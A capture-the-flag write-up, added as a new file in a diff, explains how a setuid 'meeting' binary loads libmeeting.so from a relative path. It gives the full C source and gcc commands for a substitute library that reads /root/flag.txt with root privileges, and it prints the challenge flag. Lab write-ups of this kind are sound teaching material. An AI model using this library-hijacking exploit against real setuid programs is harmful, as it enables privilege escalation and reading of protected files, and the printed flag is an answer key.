@@ -1,0 +1,49 @@
+The goal of this challenge is to analyze the meeting program, understand how it handles the hidden flag, and find a way to recover it from /root/flag.txt.
+
+1. Analyze code
+Find a function called retrieve_the_fabric(), which reads the flag from /root/flag.txt. However, I noticed that the program does not print the flag directly (it loads an external library):
+
+void* lib = dlopen("./libmeeting.so", RTLD_NOW);
+
+Then it searches for a function named meeting (program executes this function in a separate thread and prints its return value):
+
+meeting_func_t meeting =
+    (meeting_func_t)dlsym(lib, "meeting");
+
+2. Vulnerability
+I discovered that the program loads libmeeting.so from a relative path. This means that a user who controls the working directory can provide their own library
+
+Because the meeting is a setuid binary, this could allow user-controlled code to run with elevated privileges
+
+3. Code
+Supply our own meeting() function that reads /root/flag.txt directly, relying on the setuid process’s privileges:
+('program-with-name.c')
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void* meeting(void* arg) {
+    char* buf = malloc(256);
+    memset(buf, 0, 256);
+    FILE* f = fopen("/root/flag.txt", "r");
+    if (f) {
+        fgets(buf, 256, f);
+        fclose(f);
+    } else {
+        strcpy(buf, "[failed to open /root/flag.txt]");
+    }
+    return buf;
+}
+
+4. Testing
+gcc -shared -fPIC -o libmeeting.so program-with-name.c -lpthread
+./meeting
+
+Result:
+Polythread has your concent and name: threadctf{SHootinG_sOme_4toM1C_F3e7}
+
+Good luck, you'll be dyeing the buttons forever now!
+What did you think was going to happen when you give up your name to fay?
+
+
